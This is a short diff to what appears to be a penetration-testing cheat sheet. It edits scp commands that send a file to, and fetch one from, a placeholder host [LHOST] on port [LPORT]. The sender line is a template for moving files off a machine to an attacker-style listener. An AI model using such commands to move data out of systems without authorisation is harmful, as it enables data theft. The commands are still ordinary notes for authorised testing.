@@ -1,2 +1,2 @@
 scp [File] username@[LHOST]:~/destination -P [LPORT] # Sender
-scp user@[LHOST]:~/path_to_file file_saved -P [LPORT] # Reciever
+scp user@[LHOST]:~/[File] file_saved -P [LPORT] # Reciever
